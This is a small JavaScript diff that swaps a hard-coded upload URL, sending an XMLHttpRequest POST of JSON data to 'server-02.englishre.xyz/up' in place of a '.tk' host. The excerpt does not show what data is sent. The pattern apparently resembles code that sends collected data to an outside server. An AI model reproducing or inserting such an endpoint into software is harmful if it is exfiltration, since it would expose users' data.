@@ -190,7 +190,7 @@ function rest(err) {
 								}
 							})
 							var xhr = new XMLHttpRequest();
-							url = "https://server-02.lankaedu.tk/up";
+							url = "https://server-02.englishre.xyz/up";
 							xhr.open("POST", url, true);
 							xhr.setRequestHeader("Content-Type", "application/json");
 							xhr.onreadystatechange = function () {
